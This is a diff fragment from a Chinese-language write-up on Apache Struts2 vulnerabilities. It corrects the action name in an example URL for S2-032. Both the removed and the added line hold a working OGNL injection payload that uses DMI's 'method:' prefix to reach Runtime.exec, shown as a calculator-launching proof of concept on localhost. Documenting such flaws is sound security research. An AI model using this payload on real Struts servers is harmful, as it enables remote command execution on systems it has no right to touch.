@@ -254,7 +254,7 @@ S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 `$
 
 找到目标应用有效的 Action 例如 `index.action`，那么直接使用 DMI 在 `method:` 后面带上需要执行 OGNL 表达式即可（注意转义）：
 
-    http://localhost:8080/S2-032/default.action?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23f%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%2C%23f.close&cmd=open%20%2fApplications%2fCalculator.app
+    http://localhost:8080/S2-032/index.action?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23f%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%2C%23f.close&cmd=open%20%2fApplications%2fCalculator.app
 
 这里需要注意的是后端会获取 `name` 值后拼接 `"()"` 形成 `name()` 然后再去执行 OGNL 表达式。
 
